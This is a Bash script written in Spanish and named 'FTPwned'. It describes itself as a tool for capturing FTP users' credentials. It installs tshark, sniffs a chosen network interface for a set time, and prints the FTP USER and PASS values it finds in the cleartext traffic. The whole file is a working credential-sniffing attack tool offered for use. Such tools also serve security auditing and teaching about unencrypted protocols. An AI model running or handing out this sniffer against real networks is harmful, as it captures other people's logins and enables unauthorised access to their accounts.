#!/bin/bash
#Autor -> Charly0n3
#Fecha -> 03/02/2023
#Descripción -> Herramienta para capturar credenciales de usuarios ftp, usando tshark.
#No funciona si el servicio ftp ha sido encapsulado con algún sistema de cifrado ya que este programa se aprovecha de que la conversación de credenciales no viaja cifrada.

# Colores

green="\e[0;32m\033[1m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
turquesa="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"
end="\033[0m\e[0m"

# Dependencias

dependencias(){

dep=(toilet tshark)

	echo -e "${red} [*]${end} Comprobando dependencias.."; sleep 1
	echo
for program in ${dep[*]}; do

	test -f /usr/bin/$program
	if [ $(echo $?) -eq 0 ];
	then
		echo -e "${red} [#]${end} $program está instalado en su sistema"; sleep 1
	else
		echo
		echo -e "${red} [!]${end} $program no está instalado en su sistema"; sleep 1
		echo -e "${red} [!]${end} Procediendo a instalar la dependencia ${red}[$program]${end}"
		echo
		apt install $program -y &> /dev/null
	fi
done
clear
}

# Sniffer

sniffer(){

interface=$(ip a | grep "state UP" | awk '{print $2}' | sed 's/.$//')

echo
echo -e "${green}[*]${end} ¿Cuanto tiempo quieres que dure el escaneo en segundos?"
read -p " --> " time
echo
echo -e "${green}[*]${end} ¿Cual es la interfaz de red que vas a usar para el escaneo? [interfaces activas: ${green}$interface${end}]"
read -p " --> " iface
clear
echo
echo -e "${turquesa}[*]${end} Escaneando durante [ ${green}$time${end} segundos ] [ Por la interfaz ${green}$iface${end} ] ${turquesa}[*]${end}"
echo
	sudo tshark -i $iface -a duration:$time &> /dev/null > log.txt
while read line; do

	if [[ $line == *"USER"* ]]; then

	word1="$(echo $line | awk '{print $NF}')"
		for i in $(seq 1 20); do
			echo -n "-"
		done; echo
	echo
	echo -e "${turquesa}USER${end} => $word1"
	fi

	if [[ $line == *"PASS"* ]]; then

	word2="$(echo $line | awk '{print $NF}')"
	echo -e "${turquesa}PASS${end} => $word2"
	echo
		for i in $(seq 1 20); do
			echo -n "-"
		done; echo
	fi


done < log.txt

rm log.txt
}



# Main

if [ $(id -u) -eq 0 ]; then

clear
dependencias

opt=0

while [ $opt -ne 3 ]; do

	echo -e "\n        ${blue} -- Opciones -- ${end}"
	echo
	echo -e "${turquesa} 1. -->${end} Consultar interfaz con estado ${green}UP${end}."
	echo
	echo -e "${turquesa} 2. -->${end} Empezar escaneo."
	echo
	echo -e "${turquesa} 3. -->${end} Salir."
	echo
	echo -e "${red} [*]${end} Selecciona una opción [${turquesa}1${end},${turquesa}2${end},${turquesa}3${end}]: "
	read -p " --> " opt

	case $opt in


		1) # Interfaz activa
			clear
			interface=$(ip a | grep "state UP" | awk '{print $2}' | sed 's/.$//')
			echo
			for i in $(seq 1 22); do
				echo -n "--"
			done; echo
			echo
			echo -e "${green} [*]${end} Interfaz actualmente activa --> ${turquesa}$interface${end}"
			echo
			for i in $(seq 1 22); do
				echo -n "--"
			done; echo
			echo
		;;

		2) clear # Empezar escaneo
			clear
			toilet --font mono12 --filter border:metal --termwidth 'FTPwned' 2> /dev/null
			sniffer
		;;

		3) clear # Salir
			clear
			echo -e "${red} [!]${end} Saliendo.."; sleep 1
			exit 0
		;;

	esac
done

else

echo -e "${red} [*]${end} Debes ejecutar el script como root"
exit 1

fi

